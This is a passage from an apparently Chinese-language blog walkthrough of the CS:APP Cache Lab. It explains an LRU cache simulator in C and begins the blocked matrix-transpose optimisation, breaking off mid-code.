class="hljs-number">0421</span>c7f0,<span class="hljs-number">4</span><br><span class="hljs-attribute">L</span> <span class="hljs-number">04</span>f6b868,<span class="hljs-number">8</span><br><span class="hljs-attribute">S</span> <span class="hljs-number">7</span>ff0005c8,<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>其具体格式为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[space]</span>operation <span class="hljs-selector-tag">address</span>,size<br></code></pre></td></tr></table></figure><p>The operation field denotes the type of memory access: “I” denotes an instruction load, “L” a data load, “S” a data store, and “M” a data modify (i.e., a data load followed by a data store). There is never a space before each “I”. There is always a space before each “M”, “L”, and “S”. The address field specifies a 64-bit hexadecimal memory address. The size field specifies the number of bytes accessed by the operation.</p><p>4种operation</p><ul><li><code>I</code> 表示加载指令  其之前不加[space]</li><li><code>L</code>表示加载数据</li><li><code>S</code>表示存储数据</li><li><code>M</code>表示修改数据</li></ul><h3 id="回顾cache结构"><a href="#回顾cache结构" class="headerlink" title="回顾cache结构"></a>回顾cache结构</h3><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171058687.png" alt="cache"></p><p>Cache 类似于一个二维数组，它有 S&#x3D;2^s 组，每组有 E 行，每行存储的字节也是固定的。其中，每行都有一个有效位，和一个标记位。想要查找到对应的字节，我们的地址需要三部分组成：</p><ul><li>s，索引位，找到对应的组序号</li><li>tag，标记位，在组中的每一行进行匹配，判断能否命中</li><li>b，块偏移，表明在找到的行中的具体位置。本实验不考虑块偏移，完全可以忽略。</li></ul><p>那么，Cache 中的有效位是干什么的呢？判断该行是否为空。这里有一个概念：<strong>冷不命中</strong>，表示该缓存块为空造成的不命中。而一旦确定不命中不是冷不命中，那么就需要考虑行替换的问题了。我认为，行替换关乎着 Cache 的效率，是 Cache 设计的核心。</p><h3 id="回顾替换策略"><a href="#回顾替换策略" class="headerlink" title="回顾替换策略"></a>回顾替换策略</h3><p>当 CPU 要处理的字不在组中任何一行，且组中没有一个空行，那就必须从里面选取一个非空行进行替换。选取哪个空行进行替换呢？书上给了我们两种策略：</p><ul><li>LFU，最不常使用策略。替换在过去某个窗口时间内引用次数最少的那一行</li><li>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行</li></ul><p>本实验要求采取的策略为 <strong>LRU</strong>。</p><p>下面正式开始Part A。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> S;<br>    <span class="hljs-type">int</span> E;<br>    <span class="hljs-type">int</span> B;<br>    Cache_line **line;<br>&#125; Cache;<br></code></pre></td></tr></table></figure><p>用<code>Cache</code>来表示一个缓存，其包括S，B，E等特征，每一个缓存类似于一个二维数组，数组的每一个元素就是缓存中的一个行，数组的每一个元素就是缓存中的行，所以用<code>line</code>来表示这一类信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> valid;     <span class="hljs-comment">//有效位</span><br>    <span class="hljs-type">int</span> tag;       <span class="hljs-comment">//标记位</span><br>    <span class="hljs-type">int</span> time_tamp; <span class="hljs-comment">//时间戳</span><br>&#125; Cache_line;<br></code></pre></td></tr></table></figure><p>valid和tag不赘述，time_tamp是LRU算法用到的特征。</p><p>Cache的初始化如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Init_Cache</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> E, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-type">int</span> S = <span class="hljs-number">1</span> &lt;&lt; s;<br>    <span class="hljs-type">int</span> B = <span class="hljs-number">1</span> &lt;&lt; b;<br>    cache = (Cache *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Cache));<br>    cache-&gt;S = S;<br>    cache-&gt;E = E;<br>    cache-&gt;B = B;<br>    cache-&gt;line = (Cache_line **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Cache_line *) * S);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++)<br>    &#123;<br>        cache-&gt;line[i] = (Cache_line *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Cache_line) * E);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; E; j++)<br>        &#123;<br>            cache-&gt;line[i][j].valid = <span class="hljs-number">0</span>; <br>            cache-&gt;line[i][j].tag = <span class="hljs-number">-1</span>;<br>            cache-&gt;line[i][j].time_tamp = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>时间戳的初始设置为0</p><h3 id="LRU时间戳实现"><a href="#LRU时间戳实现" class="headerlink" title="LRU时间戳实现"></a>LRU时间戳实现</h3><p>时间戳越大则表示该行最后访问的时间越久远，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span>&#123;<br>    cache-&gt;line[op_s][i].valid=<span class="hljs-number">1</span>;<br>    cache-&gt;line[op_s][i].tag = op_tag;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; cache-&gt;E; k++)<br>        <span class="hljs-keyword">if</span>(cache-&gt;line[op_s][k].valid==<span class="hljs-number">1</span>)<br>            cache-&gt;line[op_s][k].time_tamp++;<br>    cache-&gt;line[op_s][i].time_tamp = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码在找到要进行的操作行后调用（无论是不命中还是命中，还是驱逐后）。前两行是对有效位和标志位的设置，与时间戳无关，主要关注后几行：</p><ul><li>遍历组中每一行，并将它们的值加1，也就是说每一行在进行一次操作后时间戳都会变大，表示它离最后操作的时间变久</li><li>将本次操作的行时间戳设置为最小，也就是0</li></ul><p>由此，每次只需要找到时间戳最大的行进行替换就可以了：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int find_LRU(int op_s)<br>&#123;<br>    int max_index <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    int max_stamp <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    for(int i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; cache-&gt;E; i++)&#123;</span><br>        if(cache-&gt;line[op_s][i].time_tamp &gt; max_stamp)&#123;<br>            max_stamp <span class="hljs-operator">=</span> cache-&gt;line[op_s][i].time_tamp<span class="hljs-comment">;</span><br>            max_index <span class="hljs-operator">=</span> i<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>    return max_index<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="缓存搜索与更新"><a href="#缓存搜索与更新" class="headerlink" title="缓存搜索与更新"></a>缓存搜索与更新</h3><p>先解决比较核心的问题，在得知要操作的组<code>op_s</code>以及标志位<code>op_tag</code>后，判断是<code>miss</code>还是<code>hit</code>还是应该<code>eviction</code>调用<code>find_LRU</code>。</p><p>先判断是<code>miss</code>还是<code>hit</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_index</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid &amp;&amp; cache-&gt;line[op_s][i].tag == op_tag)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历所有行，如果某一行有效，且标志位相同，则<code>hit</code>，返回该索引。否则，<code>miss</code>，返回 -1。当接收到-1后，有两种情况：</p><ul><li>冷不命中。组中有空行，只不过还未操作过，有效位为0，找到这个空行即可</li><li>所有行都满了。那么就要用到上面得 LRU 进行选择驱逐</li></ul><p>所以，设计一个判满的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">is_full</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>扫描完成后，得到对应行的索引值，就可以调用 LRU 更新函数进行更新了。整体调用如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void update<span class="hljs-constructor">_info(<span class="hljs-params">int</span> <span class="hljs-params">op_tag</span>, <span class="hljs-params">int</span> <span class="hljs-params">op_s</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> index = get<span class="hljs-constructor">_index(<span class="hljs-params">op_s</span>, <span class="hljs-params">op_tag</span>)</span>;<br>    <span class="hljs-keyword">if</span> (index<span class="hljs-operator"> == </span>-<span class="hljs-number">1</span>)<br>    &#123;<br>        miss_count++;<br>        <span class="hljs-keyword">if</span> (verbose)<br>            printf(<span class="hljs-string">&quot;miss &quot;</span>);<br>        <span class="hljs-built_in">int</span> i = is<span class="hljs-constructor">_full(<span class="hljs-params">op_s</span>)</span>;<br>        <span class="hljs-keyword">if</span>(i==-<span class="hljs-number">1</span>)&#123;<br>            eviction_count++;<br>            <span class="hljs-keyword">if</span>(verbose) printf(<span class="hljs-string">&quot;eviction&quot;</span>);<br>            i = find<span class="hljs-constructor">_LRU(<span class="hljs-params">op_s</span>)</span>;<br>        &#125;<br>        update(i,op_s,op_tag);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        hit_count++;<br>        <span class="hljs-keyword">if</span>(verbose)<br>            printf(<span class="hljs-string">&quot;hit&quot;</span>);<br>        update(index,op_s,op_tag);    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心函数已完成</p><h3 id="指令解析"><a href="#指令解析" class="headerlink" title="指令解析"></a>指令解析</h3><p>设计的数据结构解决了对 Cache 的操作问题，LRU 时间戳的实现解决了核心的驱逐问题，缓存扫描解决了对块中哪一列进行操作的问题，而应该对哪一块进行操作呢？接下来要解决的就是指令的解析问题了。</p><p>输入数据为<code>[space]operation address, size</code>的形式，<code>operation</code>很容易获取，重要的是从<code>address</code>中分别获取我们需要的<code>s</code>和<code>tag</code>，<code>address</code>结构如下</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171122572.png" alt="address结构"></p><p>这边用到了位移运算，右移（b+s）位即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> op_tag = address &gt;&gt; (s + b);<br></code></pre></td></tr></table></figure><p>获取 s，考虑先右移 b 位，再用无符号 0xFF… 右移后进行与操作将 tag 抹去。为什么要用无符号 0xFF… 右移呢？因为C语言中的右移为算术右移，有符号数右移补位的数为符号位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="hljs-type">unsigned</span>)(<span class="hljs-number">-1</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span>) - s));<br></code></pre></td></tr></table></figure><p>由于数据读写对于本模拟器而言没有区别，因此不同的指令对应的只是cache更新次数的问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">get_trace</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> E, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    FILE *pFile;<br>    pFile = fopen(t, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pFile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> identifier;<br>    <span class="hljs-type">unsigned</span> address;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-comment">// Reading lines like &quot; M 20,1&quot; or &quot;L 19,3&quot;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(pFile, <span class="hljs-string">&quot; %c %x,%d&quot;</span>, &amp;identifier, &amp;address, &amp;size) &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// I读不进来,忽略---size没啥用</span><br>    &#123;<br>        <span class="hljs-comment">//想办法先得到标记位和组序号</span><br>        <span class="hljs-type">int</span> op_tag = address &gt;&gt; (s + b);<br>        <span class="hljs-type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="hljs-type">unsigned</span>)(<span class="hljs-number">-1</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span>) - s));<br>        <span class="hljs-keyword">switch</span> (identifier)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-comment">//一次存储一次加载</span><br>            update_info(op_tag, op_s);<br>            update_info(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            update_info(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>            update_info(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    fclose(pFile);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>update_info</code>就是对 Cache 进行更新的函数。如果指令是<code>M</code>则一次存储一次加载，总共更新两次，其他指令只用更新一次，而<code>I</code>无需考虑。</p><h3 id="命令行获取参数"><a href="#命令行获取参数" class="headerlink" title="命令行获取参数"></a>命令行获取参数</h3><p>通过阅读<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">Cache Lab Implementation and Blocking</a>的提示，我们使用<code>getopt()</code>函数来获取命令行参数的字符串形式，然后用<code>atoi()</code>转换为要用的参数，最后用<code>switch</code>语句跳转到对应功能块。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> opt;<br>    <span class="hljs-type">int</span> s, E, b;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * s:S=2^s是组的个数</span><br><span class="hljs-comment">     * E:每组中有多少行</span><br><span class="hljs-comment">     * b:B=2^b每个缓冲块的字节数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">-1</span> != (opt = getopt(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)))<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (opt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>            print_help();<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            s = atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>            E = atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>            b = atoi(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>            <span class="hljs-built_in">strcpy</span>(t, optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            print_help();<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>    Init_Cache(s, E, b); <span class="hljs-comment">//初始化一个cache</span><br>    get_trace(s, E, b);<br>    free_Cache();<br>    <span class="hljs-comment">// printSummary(hit_count, miss_count, eviction_count)</span><br>    printSummary(hit_count, miss_count, eviction_count);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171809124.png" alt="模拟结果"></p><h2 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h2><p>In Part B you will write a transpose function in trans.c that causes as few cache misses as possible.</p><p>要求本地变量最多定义12个</p><ul><li>32 × 32: 8 points if m &lt; 300, 0 points if m &gt; 600</li><li>64 × 64: 8 points if m &lt; 1, 300, 0 points if m &gt; 2, 000</li><li>61 × 67: 10 points if m &lt; 2, 000, 0 points if m &gt; 3, 000</li></ul><p>s &#x3D; 5, E &#x3D; 1, b &#x3D; 5，缓存有32组，每组一行，一行存8个int</p><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32"></a>32*32</h4><p>根据pdf的提示，这里肯定要使用矩阵<strong>分块</strong>进行优化</p><p>首先考虑最最简单的转置情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">trans_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j++) &#123;<br>            <span class="hljs-type">int</span> tmp = A[i][j];<br>            B[j][i] = tmp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以第1行为例，在从内存读 <code>A[0][0]</code> 的时候，除了 <code>A[0][0]</code> 被加载到缓存中，它之后的 <code>A[0][1]---A[0][7]</code> 也会被加载进缓存。</p><p>但是内容写入 <code>B</code> 矩阵的时候是一列一列地写入，在列上相邻的元素不在一个内存块上，这样每次写入都不命中缓存。并且一列写完之后再返回，原来的缓存可能被覆盖了，这样就又会不命中，我们来定量分析。</p><p>缓存只够存储一个矩阵的四分之一，<code>A</code>中的元素对应的缓存行每隔8行就会重复。<code>A</code>和<code>B</code>的地址由于取余关系，每个元素对应的地址是相同的</p><p>对于<code>A</code>，每8个<code>int</code>就会占满缓存的一组，所以每一行会有 32&#x2F;8 &#x3D; 4 次不命中；而对于<code>B</code>，考虑最坏情况，每一列都有 32 次不命中，由此，算出总不命中次数为 4 × 32 + 32 × 32 &#x3D; 1152。拿程序跑一下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171842802.png" alt="最简单转置测试"></p><p>结果是1183，这是对角线部分两者冲突造成的</p><table><thead><tr><th>D</th><th>D</th><th></th><th></th></tr></thead><tbody><tr><td>C</td><td></td><td></td><td></td></tr><tr><td>C</td><td></td><td></td><td></td></tr><tr><td>C</td><td></td><td></td><td></td></tr></tbody></table><p>在写入<code>B</code>的前 8 行后，<code>B</code>的<code>D</code>区域就全部进入了缓存，此时如果能对<code>D</code>进行操作，那么就能利用上缓存的内容，不会<code>miss</code>；但是，暴力解法接下来操作的是<code>C</code>，每一个元素的写都要驱逐之前的缓存区，当来到第 2 列继续写<code>D</code>时，它对应的缓存行很可能已经被驱逐了，于是又要<code>miss</code>，也就是说，暴力解法的问题在于没有充分利用上已经进入缓存的元素</p><p>分块解决的就是同一个矩阵内部缓存块相互替换的问题。</p><p>由上述分析，显然应考虑 8 × 8 分块，这样在块的内部不会冲突，接下来判断<code>A</code>与<code>B</code>之间会不会冲突</p><p><code>A</code>中块占用的是缓存的第 0，4，8，12，16，20，24，28组，而<code>B</code>中块占用的是缓存的第2，6，10，14，18，16，30组，刚好不会冲突。事实上，<strong>除了对角线</strong>，<code>A</code>与<code>B</code>中对应的块都不会冲突。所以，我们的想法是可行的，写出代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">8</span>; k++)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> s = <span class="hljs-number">0</span>; s &lt; <span class="hljs-number">8</span>; s++)<br>                    B[j + s][i + k] = A[i + k][j + s];<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>A</code>中每一个操作块，只有每一行的第一个元素会不命中，所以为8次不命中；对于<code>B</code>中每一个操作块，只有每一列的第一个元素会不命中，所以也为 8 次不命中。总共<code>miss</code>次数为：8 × 16 × 2 &#x3D; 256</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171853615.png" alt="第二次测试"></p><p>以<code>A</code>的一个对角线块<code>p</code>，<code>B</code>与<code>p</code>相应的对角线块<code>q</code>为例，复制前， <code>p</code> 在缓存中。 复制时，<code>q</code>会驱逐<code>p</code>。 下一个开始复制 <code>p</code> 又被重新加载进入缓存驱逐 <code>q</code>，这样就会多产生两次<code>miss</code>。</p><p>如何解决这种问题呢？题目给了我们提示：</p><blockquote><p>You are allowed to define at most 12 local variables of type int per transpose function</p></blockquote><p>考虑使用 8 个本地变量一次性存下 <code>A</code> 的一行后，再复制给 <code>B</code>，代码如下：</p><p>对于非对角线上的块，本身就没有额外的冲突；对于对角线上的块，写入<code>A</code>每一行的第一个元素后，这一行的元素都进入了缓存，我们就立即用本地变量存下这 8 个元素，随后再复制给<code>B</code>。这样，就避免了第一个元素复制时，<code>B</code>把<code>A</code>的缓冲行驱逐，导致没有利用上<code>A</code>的缓冲。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span 